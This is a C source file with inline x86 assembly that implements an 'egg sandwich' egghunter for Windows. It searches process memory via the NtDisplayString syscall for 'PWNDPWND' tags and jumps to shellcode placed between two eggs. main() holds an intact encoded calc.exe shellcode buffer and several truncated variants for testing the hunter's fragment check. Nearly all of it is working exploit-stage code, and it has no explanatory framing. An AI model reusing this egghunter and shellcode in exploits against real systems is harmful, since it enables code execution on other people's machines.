#include <Windows.h>
#include <stdio.h>

int _NtDisplayStringEggSandwich () { // conversion of egghunter and omellete egghunter

	__asm{
		entry:
		loop_inc_page:
			or dx,0x0fff                        // add PAGE_SIZE - 1 to EDX to get the last address in the page 

		loop_inc_one:
			inc edx                             // increment EDX by 1 to get current address

		check_memory:
			push edx                            // save current address to stack
			push 0x02                           // push Syscall for NtDisplayString to stack
			pop eax                             // pop syscall parameter into EAX for syscall
			int 0x2e                            // issue interrupt to make syscall
			cmp al,0x5                          // compare low order byte of eax to 0x5 (indicates access violation)
			pop edx                             // restore EDX from the stack
			je loop_inc_page					// if zf flag = 1, access violation, jump back to loop_inc_page
			xor ecx,ecx							// clear counter register for check egg function
			mov edi, edx						// move current address into edi for use in scasd instruction

		check_egg:
			mov eax,0x444e5750                  // valid address, move egg value (PWND) into EAX for comparison
			scasd				                // compare value in EAX to dword value addressed by EDI
                                                // increments EDI by 4 if DF flag is 0 or decrements if 1
			jnz loop_inc_one                    // egg not found, jump back to loop_inc_one
			scasd				                // first half of egg found, compare next half
			jnz loop_inc_one		            // only first half found, jump back to loop_inc_one

		found_egg:
			mov esi,edi                         // first egg found, move start address of shellcode to ESI for LODSB  
			xor eax, eax                        // clear EAX for add/sub instructions
			lodsb                               // loads egg number (1 or 2) into AL
			cmp al,0x1                          // determine if this is the first egg or second egg
			lodsb								// this will either load the offset (first egg) or chunk count (second egg) into AL
			jz first_egg						// if first egg, go to first_egg
			jmp second_egg						// second egg found, go to second_egg

		first_egg:
			inc ecx								// increment egg counter to represent first egg	
			add edi, eax                        // increment EDX by size of shellcode to point to 2nd egg for next check_egg
			lodsb                               // loads egg number check into AL
			cmp al,0x1                          // determine if this is the end of the first egg
			jnz first_egg 						// more offset bytes remain, jump back to first_egg
			mov ebx,esi							// end of first egg, move start of shellcode into EBX for second_egg
			jmp check_egg                       // still more offsets left in first egg; jump back to beginning of first_egg

		second_egg: 
			cmp al,cl							// check if egg2 chunk count matches cl counter
			jnz check_egg                       // if not, egg2 likely found first, indicating shellcode fragment
			jmp ebx								// otherwise, execute shellcode
	}
}

int  main(){
	
	// only the beginning of shellcode
	char badshell1[]="\x50\x57\x4e\x44\x50\x57\x4e\x44" // egg #1 = PWNDPWND
					 "\x01\xff\x4d\x01"  
					"\xba\xe2\x92\x89\xa5\xda\xc5\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
					"\x4c\x83\xed\xfc\x31\x55\x0f\x03\x55\xed\x70\x7c\x1a\x25\xe1"
					"\x9c\x4b\x1c\xcd\xba\xe0\xba\x26\x61\x3a\x0b\x77\xdf\x0d\xf6"
					"\x6c\xe3\x10\x1c\x0e\x26\xee\x2a\x70\x97\x03\x5c\x20\x48\xb8"
					"\x4d\x7e\xd2\x9f\xc8\x61\x4f\xbe\xc6\x03\x3a\xf7\xb4\xd5\xdb"
					"\xd8\x61\x7d\x53\x8b\xe2\x63\x72\x1d\x14\x3e\xac\x3e\xf0\xce"
					"\x60\x0a\xbb\xa8\xa7\x9e\xc3\x56\x26\x71\x77\xa7\x2b\x41\x67"
					"\xf0\x43\x48\x46\x58\x96\x69\x74\x28\x31\x32\x0d\xc5\x86\x68"
					"\xfe\x98\x9c\x44\x67\x11\x54\xf8\x54\xda\x89\x7f\x73\x8f\x00"
					"\x72\xf0\xac\x5d\x0d\x19\xae\x37\xa7\x4b\x05\x99\xa8\xbc\xe2"
					"\x09\x61\xfd\x20\x6d\x6f\x4b\x4b\x92\x63\x08\xd9\x5d\xc6\x5c"
					"\x66\x2e\x34\x43\xbf\x37\xb4\xe8\xba\x8a\x0f\x06\xd0\x86\xc7";


   // only the end of the shellcode
   char badshell2[] = "\x34\xfa\xdd\x91\x00\x47\x0a\x17\xcd\xae\xab\x91\x85\xe5\x96"
					"\x50\x4e\xc4\xd7\xaf\xc5\x5d\x34\x02\x21\xdd\x00\x96\x5c\x5f"
					"\x2a\x52\x81\xdd\x81\xdc\xac\x16\x55\xc0\x87\xba\x32"
				    "\x50\x57\x4e\x44\x50\x57\x4e\x44" // egg #2 = PWNDPWND
					"\x02\x02"; // egg identifer (2) and chunk counter

   // missing the middle of the shellcode
   char badshell3[] ="\x50\x57\x4e\x44\x50\x57\x4e\x44" // egg #1 = PWNDPWND
					"\x01\xff\x4d\x01"  
					"\xba\xe2\x92\x89\xa5\xda\xc5\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
					"\x4c\x83\xed\xfc\x31\x55\x0f\x03\x55\xed\x70\x7c\x1a\x25\xe1"
					"\x9c\x4b\x1c\xcd\xba\xe0\xba\x26\x61\x3a\x0b\x77\xdf\x0d\xf6"
					"\x6c\xe3\x10\x1c\x0e\x26\xee\x2a\x70\x97\x03\x5c\x20\x48\xb8"
					"\x4d\x7e\xd2\x9f\xc8\x61\x4f\xbe\xc6\x03\x3a\xf7\xb4\xd5\xdb"
					"\xd8\x61\x7d\x53\x8b\xe2\x63\x72\x1d\x14\x3e\xac\x3e\xf0\xce"
					"\x60\x0a\xbb\xa8\xa7\x9e\xc3\x56\x26\x71\x77\xa7\x2b\x41\x67"
					"\xf0\x43\x48\x46\x58\x96\x69\x74\x28\x31\x32\x0d\xc5\x86\x68"
					"\xfe\x98\x9c\x44\x67\x11\x54\xf8\x54\xda\x89\x7f\x73\x8f\x00"
					"\x72\xf0\xac\x5d\x0d\x19\xae\x37\xa7\x4b\x05\x99\xa8\xbc\xe2"
					"\x09\x61\xfd\x20\x6d\x6f\x4b\x4b\x92\x63\x08\xd9\x5d\xc6\x5c"
					"\x66\x2e\x34\x43\xbf\x37\xb4\xe8\xba\x8a\x0f\x06\xd0\x86\xc7"
					"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
					"\x34\xfa\xdd\x91\x00\x47\x0a\x17\xcd\xae\xab\x91\x85\xe5\x96"
					"\x50\x4e\xc4\xd7\xaf\xc5\x5d\x34\x02\x21\xdd\x00\x96\x5c\x5f"
					"\x2a\x52\x81\xdd\x81\xdc\xac\x16\x55\xc0\x87\xba\x32"
				    "\x50\x57\x4e\x44\x50\x57\x4e\x44" // egg #2 = PWNDPWND
					"\x02\x02"; // egg identifer (2) and chunk counter
	
    // intact shellcode
	char shell[] =	"\x50\x57\x4e\x44\x50\x57\x4e\x44" // egg #1 = PWNDPWND
					"\x01\xff\x4d\x01"  // size offsets (255 + 77 = 332) and egg id tags (x01) 
					// start calc.exe shellcode (size 328)...
					"\xba\xe2\x92\x89\xa5\xda\xc5\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
					"\x4c\x83\xed\xfc\x31\x55\x0f\x03\x55\xed\x70\x7c\x1a\x25\xe1"
					"\x9c\x4b\x1c\xcd\xba\xe0\xba\x26\x61\x3a\x0b\x77\xdf\x0d\xf6"
					"\x6c\xe3\x10\x1c\x0e\x26\xee\x2a\x70\x97\x03\x5c\x20\x48\xb8"
					"\x4d\x7e\xd2\x9f\xc8\x61\x4f\xbe\xc6\x03\x3a\xf7\xb4\xd5\xdb"
					"\xd8\x61\x7d\x53\x8b\xe2\x63\x72\x1d\x14\x3e\xac\x3e\xf0\xce"
					"\x60\x0a\xbb\xa8\xa7\x9e\xc3\x56\x26\x71\x77\xa7\x2b\x41\x67"
					"\xf0\x43\x48\x46\x58\x96\x69\x74\x28\x31\x32\x0d\xc5\x86\x68"
					"\xfe\x98\x9c\x44\x67\x11\x54\xf8\x54\xda\x89\x7f\x73\x8f\x00"
					"\x72\xf0\xac\x5d\x0d\x19\xae\x37\xa7\x4b\x05\x99\xa8\xbc\xe2"
					"\x09\x61\xfd\x20\x6d\x6f\x4b\x4b\x92\x63\x08\xd9\x5d\xc6\x5c"
					"\x66\x2e\x34\x43\xbf\x37\xb4\xe8\xba\x8a\x0f\x06\xd0\x86\xc7"
					"\xc1\xe0\xff\x91\xa3\xa7\x35\x27\x84\x70\xca\x25\x0e\x09\x6d"
					"\x70\xbe\x9a\x42\x87\xb9\xe5\x9b\xc4\x1d\xe9\xcb\xb1\x11\x94"
					"\xaa\x08\xba\xeb\x9d\x46\x4c\x24\x67\x45\x28\x69\x4a\x3b\xa5"
					"\x94\x8b\xfe\x5b\x6c\x31\x9e\xd7\x3a\x1d\x2f\xa0\x64\xd6\x98"
					"\x63\xf1\xb8\x17\x57\xec\x14\xfd\xf9\x22\xf0\x20\x79\x72\x13"
					"\xa7\x4f\xc2\xca\x54\xe5\xbf\xad\x88\xcc\xe6\xdd\x49\xc4\x75"
					"\x07\x78\xe4\x74\xeb\x71\x92\x49\x76\x5a\xcb\xb9\xcf\x11\x50"
					"\x34\xfa\xdd\x91\x00\x47\x0a\x17\xcd\xae\xab\x91\x85\xe5\x96"
					"\x50\x4e\xc4\xd7\xaf\xc5\x5d\x34\x02\x21\xdd\x00\x96\x5c\x5f"
					"\x2a\x52\x81\xdd\x81\xdc\xac\x16\x55\xc0\x87\xba\x32"
					// end calc.exe shellcode
					"\x50\x57\x4e\x44\x50\x57\x4e\x44" // egg #2 = PWNDPWND
					"\x02\x02"; // egg identifer (2) and chunk counter
	
   // missing the middle of the shellcode
   char badshell4[] ="\x50\x57\x4e\x44\x50\x57\x4e\x44" // egg #1 = PWNDPWND
					"\x01\xff\x4d\x01"  
					"\xba\xe2\x92\x89\xa5\xda\xc5\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
					"\x4c\x83\xed\xfc\x31\x55\x0f\x03\x55\xed\x70\x7c\x1a\x25\xe1"
					"\x9c\x4b\x1c\xcd\xba\xe0\xba\x26\x61\x3a\x0b\x77\xdf\x0d\xf6"
					"\x6c\xe3\x10\x1c\x0e\x26\xee\x2a\x70\x97\x03\x5c\x20\x48\xb8"
					"\x4d\x7e\xd2\x9f\xc8\x61\x4f\xbe\xc6\x03\x3a\xf7\xb4\xd5\xdb"
					"\xd8\x61\x7d\x53\x8b\xe2\x63\x72\x1d\x14\x3e\xac\x3e\xf0\xce"
					"\x60\x0a\xbb\xa8\xa7\x9e\xc3\x56\x26\x71\x77\xa7\x2b\x41\x67"
					"\xf0\x43\x48\x46\x58\x96\x69\x74\x28\x31\x32\x0d\xc5\x86\x68"
					"\xfe\x98\x9c\x44\x67\x11\x54\xf8\x54\xda\x89\x7f\x73\x8f\x00"
					"\x72\xf0\xac\x5d\x0d\x19\xae\x37\xa7\x4b\x05\x99\xa8\xbc\xe2"
					"\x09\x61\xfd\x20\x6d\x6f\x4b\x4b\x92\x63\x08\xd9\x5d\xc6\x5c"
					"\x66\x2e\x34\x43\xbf\x37\xb4\xe8\xba\x8a\x0f\x06\xd0\x86\xc7"
					"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
					"\x34\xfa\xdd\x91\x00\x47\x0a\x17\xcd\xae\xab\x91\x85\xe5\x96"
					"\x50\x4e\xc4\xd7\xaf\xc5\x5d\x34\x02\x21\xdd\x00\x96\x5c\x5f"
					"\x2a\x52\x81\xdd\x81\xdc\xac\x16\x55\xc0\x87\xba\x32"
				    "\x50\x57\x4e\x44\x50\x57\x4e\x44" // egg #2 = PWNDPWND
					"\x02\x02"; // egg identifer (2) and chunk counter

	_NtDisplayStringEggSandwich ();
		 
	

}
